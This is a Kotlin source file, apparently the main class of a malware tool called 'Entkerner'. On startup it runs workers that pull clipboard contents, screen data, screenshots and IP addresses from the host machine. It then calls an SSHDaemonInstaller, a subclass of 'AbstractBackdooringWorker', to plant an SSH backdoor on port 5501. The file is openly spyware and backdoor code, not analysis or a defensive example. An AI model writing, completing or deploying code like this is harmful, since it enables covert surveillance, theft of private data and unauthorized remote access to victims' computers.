package net.kerner.entkerner

import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.plugins.cookies.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.AbstractDataExtractor
import net.kerner.entkerner.abstract.get
import net.kerner.entkerner.extractors.screen.ScreenData
import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
import net.kerner.entkerner.extractors.ssh.SSHDaemonInstaller
import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
import net.kerner.entkerner.extractors.standart.IPAddressExtractionWorker
import net.kerner.entkerner.model.SystemType
import java.net.InetAddress

class Entkerner {
    val system = when(System.getProperty("os.name").lowercase()) {
        "windows " -> SystemType.WINDOWS
        "linux" -> SystemType.LINUX
        "xnu" -> SystemType.XNU // probably not working, need to test each of these
        else -> SystemType.WINDOWS // most common used on desktop
    }
    private val httpClient = HttpClient(CIO) {
        install(ContentNegotiation) {
            json(Json {
                ignoreUnknownKeys = true
                prettyPrint = true
            })
        }
        install(HttpCookies) {

        }
    }
    init {
        runBlocking {
            val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient))
            val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient))
            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
            val ip = runExtractor<List<String>>(IPAddressExtractionWorker(httpClient))
            runInstaller(SSHDaemonInstaller(httpClient, this@Entkerner, 5501))
        }
    }
    private suspend inline fun <reified V : Any> runExtractor(dataExtractor: AbstractDataExtractor<*>): V {
        val file = dataExtractor.fileDirectories[system].toFile()
        val result = dataExtractor.run<V>(file)
        println(Json.encodeToString(result))
        return result
    }

    private fun runInstaller(backdoorWorker: AbstractBackdooringWorker) {
        backdoorWorker.buildDoor(backdoorWorker.file[system].toFile())
    }
}

fun main() {
    Entkerner()
}